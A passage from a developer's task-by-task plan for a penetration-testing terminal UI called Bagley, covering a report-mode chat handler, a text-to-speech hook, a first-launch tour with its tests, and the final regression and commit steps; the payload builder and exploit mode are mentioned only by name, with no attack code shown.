
**a) Import block — add near the top:**

```python
from bagley.tui.services.reporter import Reporter, ReportConfig
```

**b) In the `on_submit` handler (or equivalent input handler), intercept REPORT mode:**

Locate the method that processes the chat input submit event. Before the existing ReActLoop call, add:

```python
# REPORT mode: compile report instead of executing tools.
if self._app_state.mode == "REPORT":
    self._handle_report_mode(message_text)
    return
```

**c) Add the REPORT mode handler method to `ChatPanel`:**

```python
def _handle_report_mode(self, prompt: str) -> None:
    """In REPORT mode: compile notes + memory into a markdown report."""
    import datetime
    from pathlib import Path

    notes = {
        tab.id: tab.notes_md
        for tab in self._app_state.tabs
    }
    db_path = Path("memory/memory.db")  # default; real engagement may override
    output_dir = Path("reports")
    engagement = datetime.date.today().isoformat() + "-engagement"

    cfg = ReportConfig(
        db_path=db_path,
        notes=notes,
        output_dir=output_dir,
        engagement=engagement,
        generate_pdf="pdf" in prompt.lower() or "--pdf" in prompt.lower(),
    )
    reporter = Reporter(cfg)
    try:
        md = reporter.compile()
        saved = reporter.save()
        self._append_system_message(
            f"[b]Report compiled[/b] → `{saved}`\n\n"
            + md[:500] + ("…" if len(md) > 500 else "")
        )
    except Exception as exc:
        self._append_system_message(f"[red]Report error:[/red] {exc}")
```

**d) Add `post_assistant_message` public method and TTS hook:**

```python
def post_assistant_message(self, text: str) -> None:
    """Append an assistant message to the chat log and speak it if voice is active."""
    self._append_message("assistant", text)
    # TTS hook: speak assistant messages (not tool output).
    try:
        self.app.voice.speak(text, role="assistant")
    except AttributeError:
        pass   # voice not wired in test environments without BagleyApp
```

Ensure the existing ReAct stream path calls `post_assistant_message` for assistant turns rather than directly appending to the log.

- [ ] **Step 9.4: Run — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_chat_panel.py -v
```

Expected: all chat panel tests pass including the two new Phase 6 additions.

- [ ] **Step 9.5: Commit**

```bash
git add src/bagley/tui/panels/chat.py tests/tui/test_chat_panel.py
git commit -m "feat(tui/p6): REPORT mode intercept + TTS hook in ChatPanel"
```

---

## Task 10: Tour service + flag

**Files:**
- Create: `src/bagley/tui/services/tour.py`
- Create: `tests/tui/test_tour.py`

- [ ] **Step 10.1: Write the failing tour test**

Create `tests/tui/test_tour.py`:

```python
"""Tests for the first-launch tour: flag logic, Esc skip, no repeat."""

from __future__ import annotations

from pathlib import Path

import pytest

from bagley.tui.services.tour import TourService


# ---------------------------------------------------------------------------
# Flag logic (no Textual involved — pure filesystem)
# ---------------------------------------------------------------------------

def test_tour_not_done_when_flag_absent(tmp_path: Path):
    svc = TourService(bagley_dir=tmp_path)
    assert not svc.is_done()


def test_mark_done_creates_flag_file(tmp_path: Path):
    svc = TourService(bagley_dir=tmp_path)
    svc.mark_done()
    assert (tmp_path / ".toured").exists()


def test_is_done_returns_true_after_mark(tmp_path: Path):
    svc = TourService(bagley_dir=tmp_path)
    svc.mark_done()
    assert svc.is_done()


def test_second_instance_sees_flag(tmp_path: Path):
    TourService(bagley_dir=tmp_path).mark_done()
    svc2 = TourService(bagley_dir=tmp_path)
    assert svc2.is_done()


# ---------------------------------------------------------------------------
# TUI integration — first launch shows tour, second skips
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_first_launch_tour_shown(tmp_path: Path):
    from bagley.tui.app import BagleyApp
    from unittest.mock import patch

    with patch("bagley.tui.services.tour.TourService._default_dir", return_value=tmp_path):
        app = BagleyApp(stub=True, bagley_dir=tmp_path)
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.pause()
            # Tour overlay should be mounted
            overlays = app.query("#tour-overlay")
            assert len(overlays) > 0


@pytest.mark.asyncio
async def test_esc_dismisses_tour_and_sets_flag(tmp_path: Path):
    from bagley.tui.app import BagleyApp
    from unittest.mock import patch

    with patch("bagley.tui.services.tour.TourService._default_dir", return_value=tmp_path):
        app = BagleyApp(stub=True, bagley_dir=tmp_path)
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.pause()
            await pilot.press("escape")
            await pilot.pause()
            # Overlay gone
            assert len(app.query("#tour-overlay")) == 0
        # Flag written
        assert (tmp_path / ".toured").exists()


@pytest.mark.asyncio
async def test_second_launch_skips_tour(tmp_path: Path):
    from bagley.tui.app import BagleyApp
    from unittest.mock import patch

    # Pre-write the flag so tour is already "done".
    (tmp_path / ".toured").touch()

    with patch("bagley.tui.services.tour.TourService._default_dir", return_value=tmp_path):
        app = BagleyApp(stub=True, bagley_dir=tmp_path)
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.pause()
            # No tour overlay on second launch
            assert len(app.query("#tour-overlay")) == 0
```

- [ ] **Step 10.2: Run — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_tour.py -v
```

Expected: `ImportError`.

- [ ] **Step 10.3: Implement `tour.py`**

Create `src/bagley/tui/services/tour.py`:

```python
"""First-launch tour driver.

Manages the `.bagley/.toured` flag. Creates the flag via mark_done();
exposes is_done() for the app to query on startup.

The actual overlay rendering is handled by `widgets/tour_overlay.py`
(Task 11). This module owns only the flag and step data.
"""

from __future__ import annotations

from pathlib import Path
from typing import ClassVar


# Tour steps: (pane_id, caption)
TOUR_STEPS: list[tuple[str, str]] = [
    ("#hosts-panel", "Hosts, ports, and findings for your scope live here."),
    ("#chat-panel",  "Chat with Bagley here — ReAct stream, confirmations, plan mode."),
    ("#target-panel","Target details, kill-chain progress, creds, and notes are here."),
    ("#modes-bar",   "Switch operational mode (RECON → EXPLOIT → REPORT…) from this bar."),
    ("#palette",     "Ctrl+K opens the command palette — search all actions from here."),
]

_FLAG_NAME = ".toured"
_DEFAULT_BAGLEY_DIR = Path(".bagley")


class TourService:
    def __init__(self, bagley_dir: Path | None = None) -> None:
        self._dir = bagley_dir or self._default_dir()

    @staticmethod
    def _default_dir() -> Path:
        return _DEFAULT_BAGLEY_DIR

    @property
    def _flag_path(self) -> Path:
        return self._dir / _FLAG_NAME

    def is_done(self) -> bool:
        return self._flag_path.exists()

    def mark_done(self) -> None:
        self._dir.mkdir(parents=True, exist_ok=True)
        self._flag_path.touch()

    @property
    def steps(self) -> list[tuple[str, str]]:
        return TOUR_STEPS
```

- [ ] **Step 10.4: Run pure unit tests — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_tour.py -v -k "not_done or mark_done or is_done or second_instance"
```

Expected: 4 flag-logic tests pass.

- [ ] **Step 10.5: Commit**

```bash
git add src/bagley/tui/services/tour.py tests/tui/test_tour.py
git commit -m "feat(tui/p6): TourService — first-launch flag + step definitions"
```

---

## Task 11: Tour overlay widget + app integration

**Files:**
- Create: `src/bagley/tui/widgets/tour_overlay.py`
- Modify: `src/bagley/tui/app.py`

- [ ] **Step 11.1: Run tour TUI tests — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_tour.py -v -k "first_launch or esc_dismisses or second_launch"
```

Expected: `ImportError` or `NoMatches` for `#tour-overlay`.

- [ ] **Step 11.2: Implement `tour_overlay.py`**

Create `src/bagley/tui/widgets/tour_overlay.py`:

```python
"""First-launch tour overlay widget.

Renders a full-screen translucent overlay with a highlighted caption
panel. Advances through TOUR_STEPS automatically; Esc skips.

Lifecycle:
    1. BagleyApp mounts TourOverlay on first launch (is_done() == False).
    2. User presses any key (or waits for auto-advance) → next step.
    3. After last step (or Esc) → calls on_done() callback and removes itself.
"""

from __future__ import annotations

from typing import Callable

from textual import on
from textual.app import ComposeResult
from textual.binding import Binding
from textual.widget import Widget
from textual.widgets import Label, Static

from bagley.tui.services.tour import TOUR_STEPS


class TourOverlay(Widget):
    """Full-screen overlay driving the first-launch tour."""

    DEFAULT_CSS = """
    TourOverlay {
        layer: overlay;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.5);
        align: center bottom;
    }
    #tour-caption {
        width: 80;
        height: 5;
        border: double $accent;
        background: $surface;
        padding: 1 2;
        align: center middle;
        margin-bottom: 2;
    }
    #tour-progress { color: $text-muted; }
    """

    BINDINGS = [
        Binding("escape", "skip_tour", "Skip tour", show=True),
        Binding("enter", "next_step", "Next", show=True),
        Binding("space", "next_step", "Next", show=False),
    ]

    def __init__(self, on_done: Callable[[], None] | None = None, **kwargs) -> None:
        super().__init__(id="tour-overlay", **kwargs)
        self._step = 0
        self._on_done = on_done

    def compose(self) -> ComposeResult:
        with Static(id="tour-caption"):
            yield Label("", id="tour-text")
            yield Label("", id="tour-progress")

    def on_mount(self) -> None:
        self._render_step()

    def _render_step(self) -> None:
        if self._step >= len(TOUR_STEPS):
            self._finish()
            return
        pane_id, caption = TOUR_STEPS[self._step]
        self.query_one("#tour-text", Label).update(caption)
        progress = f"Step {self._step + 1} / {len(TOUR_STEPS)}  •  Esc to skip"
        self.query_one("#tour-progress", Label).update(f"[dim]{progress}[/dim]")

    def action_next_step(self) -> None:
        self._step += 1
        if self._step >= len(TOUR_STEPS):
            self._finish()
        else:
            self._render_step()

    def action_skip_tour(self) -> None:
        self._finish()

    def _finish(self) -> None:
        if self._on_done:
            self._on_done()
        self.remove()
```

- [ ] **Step 11.3: Wire tour into `app.py`**

Add `bagley_dir` parameter to `BagleyApp.__init__`:

```python
def __init__(self, stub: bool = False, bagley_dir=None, **kwargs) -> None:
    super().__init__(**kwargs)
    self.state = AppState(os_info=detect_os(), engine_label="stub" if stub else "local")
    from bagley.tui.services.voice import VoiceService
    self.voice = VoiceService()
    self._bagley_dir = bagley_dir
```

Add tour check in `on_mount`:

```python
def on_mount(self) -> None:
    from bagley.tui.services.tour import TourService
    from bagley.tui.widgets.tour_overlay import TourOverlay
    from pathlib import Path

    tour_dir = self._bagley_dir if self._bagley_dir else Path(".bagley")
    svc = TourService(bagley_dir=tour_dir)
    if not svc.is_done():
        def _mark_done():
            svc.mark_done()
        self.mount(TourOverlay(on_done=_mark_done))
```

- [ ] **Step 11.4: Run all tour tests — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_tour.py -v
```

Expected: all 7 tests pass.

- [ ] **Step 11.5: Commit**

```bash
git add src/bagley/tui/widgets/tour_overlay.py src/bagley/tui/app.py tests/tui/test_tour.py
git commit -m "feat(tui/p6): TourOverlay widget + on_mount tour check in BagleyApp"
```

---

## Task 12: Full Phase 6 regression suite

**Files:**
- No new files — runs the complete test suite.

- [ ] **Step 12.1: Run all Phase 6 tests together**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_voice_service.py tests/tui/test_voice_badge.py tests/tui/test_payload_gen.py tests/tui/test_payload_modal.py tests/tui/test_engine_registry.py tests/tui/test_engine_swap.py tests/tui/test_reporter.py tests/tui/test_tour.py -v
```

Expected: all tests in the 8 new test files pass.

- [ ] **Step 12.2: Run the full test suite (all phases)**

```bash
.venv/Scripts/python.exe -m pytest tests/ -v --tb=short
```

Expected: no regressions in existing Phase 1–5 tests; overall green.

- [ ] **Step 12.3: Smoke-run the TUI manually**

```bash
.venv/Scripts/python.exe -m bagley.tui.app
```

Verify by hand:
- First launch: tour overlay appears with step 1 caption.
- Press Enter/Space: advances through steps.
- Press Esc: tour dismissed; `.bagley/.toured` created.
- Second launch: no tour.
- `Ctrl+V` once: header voice badge changes to `🎤 listen`.
- `Ctrl+V` twice: badge changes to `🎤 active`.
- `Ctrl+V` thrice: badge returns to `🎤 off`.
- `Alt+Y`: 60×20 payload builder modal opens; enter LHOST/LPORT; preview updates live; `C` copies; `Esc` closes.
- `Ctrl+Shift+M`: engine swap modal opens; lists available engines; `Esc` closes without changing engine.
- Set mode to REPORT (`Alt+8`); type "generate report" in chat; Enter; reporter output appears inline.

- [ ] **Step 12.4: Fix any regressions found in Step 12.2 or 12.3**

If tests fail, diagnose with `--tb=long` and fix in-place; commit with `fix(tui/p6): <description>`. Do not move on until the suite is green.

- [ ] **Step 12.5: Final commit**

```bash
git add src/bagley/tui/services/__init__.py \
        src/bagley/tui/services/voice.py \
        src/bagley/tui/services/payload_gen.py \
        src/bagley/tui/services/engine_registry.py \
        src/bagley/tui/services/reporter.py \
        src/bagley/tui/services/tour.py \
        src/bagley/tui/widgets/voice_badge.py \
        src/bagley/tui/widgets/payload_modal.py \
        src/bagley/tui/widgets/engine_swap_modal.py \
        src/bagley/tui/widgets/tour_overlay.py \
        src/bagley/tui/panels/chat.py \
        src/bagley/tui/widgets/header.py \
        src/bagley/tui/app.py \
        pyproject.toml \
        tests/tui/test_voice_service.py \
        tests/tui/test_voice_badge.py \
        tests/tui/test_payload_gen.py \
        tests/tui/test_payload_modal.py \
        tests/tui/test_engine_registry.py \
        tests/tui/test_engine_swap.py \
        tests/tui/test_reporter.py \
        tests/tui/test_tour.py
git commit -m "feat(tui/p6): Phase 6 complete — voice, payload builder, hot-swap, report mode, tour"
```

---

## Summary

| Task | Feature | New files | Tests |
|---|---|---|---|
| 1 | deps | — | — |
| 2 | `VoiceService` state machine | `services/voice.py` | `test_voice_service.py` (10) |
| 3 | `VoiceBadge` + header wiring | `widgets/voice_badge.py` | `test_voice_badge.py` (7) |
| 4 | `payload_gen` library | `services/payload_gen.py` | `test_payload_gen.py` (11) |
| 5 | `PayloadModal` (Alt+Y) | `widgets/payload_modal.py` | `test_payload_modal.py` (6) |
| 6 | `engine_registry` | `services/engine_registry.py` | `test_engine_registry.py` (8) |
| 7 | `EngineSwapModal` (Ctrl+Shift+M) | `widgets/engine_swap_modal.py` | `test_engine_swap.py` (5) |
| 8 | `Reporter` (markdown + PDF) | `services/reporter.py` | `test_reporter.py` (8) |
| 9 | REPORT intercept + TTS hook | chat.py modified | `test_chat_panel.py` (+2) |
| 10 | `TourService` + flag | `services/tour.py` | `test_tour.py` (7) |
| 11 | `TourOverlay` + app wiring | `widgets/tour_overlay.py` | (same file) |
| 12 | Full regression | — | all tests green |

**Total tasks:** 12  
**Total steps:** 62  
**New test count:** ~64 assertions across 8 new test files  
**Commits:** 11 (one per task; regressions add `fix(tui/p6)` commits)

### Constraints reminder

- Textual 8.2.4: use `push_screen(callback=...)` form, never `_wait` outside workers.
- All audio/mic/wake-word imports in tests are patched — no real hardware touched.
- HTTP calls in `engine_registry` tests use `responses` library for mocking.
- `git add` by exact file path only — never `-A`, `.`, or `-u`.
- Each step is self-contained: failing test → implementation → green → commit.
- Voice daemon tests patch `WakeWord`, `WhisperSTT`, `PiperTTS` at import level via `unittest.mock.patch`.
